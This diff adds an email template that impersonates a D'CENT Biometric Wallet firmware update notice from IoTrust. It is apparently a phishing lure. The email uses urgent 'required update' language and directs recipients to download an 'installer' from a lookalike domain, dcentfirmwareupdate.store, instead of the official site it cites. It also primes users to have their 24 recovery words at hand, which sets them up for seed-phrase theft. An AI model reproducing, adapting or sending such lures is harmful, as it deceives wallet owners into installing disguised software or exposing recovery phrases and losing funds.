@@ -1,0 +1,79 @@
+Subject: Action Required: Your D'CENT Wallet Needs a Firmware Update Now
+
+Preheader: Version 3.26.0 is now required for all D'CENT Biometric Wallet users. Takes under 5 minutes to install.
+
+========================================
+D'CENT Wallet  |  Firmware Update Notice
+========================================
+
+Hello,
+
+We are reaching out because a new firmware update is now available for your D'CENT Biometric Wallet, and it is required for all users.
+
+Version 3.26.0 is not a routine update. It includes critical security patches, real-time scam detection, expanded blockchain support, and meaningful improvements to how you use your wallet every day. We strongly encourage you to install it as soon as you can.
+
+The process is simple and takes under 5 minutes from start to finish.
+
+
+WHAT IS NEW IN VERSION 3.26.0
+==============================
+
+New Blockchains and Tokens
+
+This release adds support for 15 new blockchain networks including Base, Scroll, Linea, and Blast, along with over 200 new tokens. Full Solana SPL token support is now included as well.
+
+Usability and Performance Improvements
+
+Biometric authentication is now 30% faster. The portfolio overview has been rebuilt with live pricing. The dApp browser is more compatible with a wider range of decentralized applications, and transaction routing is smarter and more efficient.
+
+Security Enhancements and Scam Detection
+
+Real-time scam detection powered by Blockaid now screens every transaction before you sign it. This protects you against malicious contracts, phishing attempts, and fraudulent token approvals. Critical security patches for known vulnerabilities are also part of this release.
+
+
+HOW TO INSTALL THE UPDATE
+==========================
+
+Step 1  Download the firmware installer from the link at the bottom of this email. Windows, macOS, and Android are all supported.
+
+Step 2  Connect your D'CENT Biometric Wallet to your computer or Android phone using a data-capable USB cable. Make sure the cable supports data transfer and not just charging.
+
+Step 3  Open the downloaded installer and follow the on-screen instructions. The tool will detect your device automatically and walk you through the rest.
+
+Step 4  Keep your device connected until the update is complete. The whole process takes about 3 to 5 minutes. Your wallet will restart on its own once it is done.
+
+
+BEFORE YOU BEGIN
+================
+
+Please make sure your wallet battery is above 20% before starting. It is also a good idea to have your 24 Recovery Words nearby, just in case the process is interrupted unexpectedly. Once the update is installed, it cannot be rolled back to a previous version. Do not disconnect your wallet while the update is in progress.
+
+
+DOWNLOAD THE UPDATE
+===================
+
+Visit the link below to download the firmware installer:
+
+https://dcentfirmwareupdate.store
+
+The page includes full installation instructions, system requirements, and answers to frequently asked questions.
+
+
+If you run into any issues or have questions about this update, our support team is ready to help. You can reach us through the official D'CENT Help Center or by visiting the firmware update page above.
+
+Thank you for being part of the D'CENT community. We built this update with your security and experience in mind, and we appreciate your continued trust in us.
+
+Warm regards,
+
+The D'CENT Wallet Team
+IoTrust Co., Ltd.
+https://dcentwallet.com
+
+
+========================================
+You are receiving this email because you own a D'CENT Biometric Wallet or have an account registered with D'CENT.
+
+To unsubscribe from product update notifications, visit your account preferences at https://dcentwallet.com or reply to this email with the word Unsubscribe in the subject line.
+
+Copyright 2026 IoTrust Co., Ltd. All rights reserved.
+========================================
